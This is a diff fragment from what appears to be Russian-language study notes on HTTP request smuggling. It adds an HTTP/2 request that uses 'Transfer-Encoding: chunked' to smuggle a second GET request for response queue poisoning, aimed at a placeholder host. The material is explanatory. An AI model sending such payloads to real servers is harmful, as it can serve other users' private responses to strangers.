@@ -770,8 +770,20 @@ __________________________________________
 
 > заставляет сервер front-end начать сопоставлять ответы от back-end с неправильными запросами. На практике это означает, что всем пользователям одного и того же соединения front-end/back-end постоянно отправляются ответы, которые предназначались кому-то другому.
 
+```python
+POST /x HTTP/2
+Host: site.net
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
 
+0
 
+GET /x HTTP/1.1
+Host: site.net
+Content-Type: application/x-www-form-urlencoded
+\r\n
+
+```
 
 
 
